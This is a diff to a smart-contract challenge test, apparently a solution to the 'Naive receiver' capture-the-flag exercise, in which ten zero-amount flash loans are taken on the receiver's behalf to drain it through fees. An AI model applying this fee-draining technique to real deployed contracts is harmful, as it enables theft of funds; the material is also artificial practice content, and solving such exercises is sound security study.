@@ -30,7 +30,17 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
+        this.pool.flashLoan(this.receiver.address,0);
     });
 
     after(async function () {
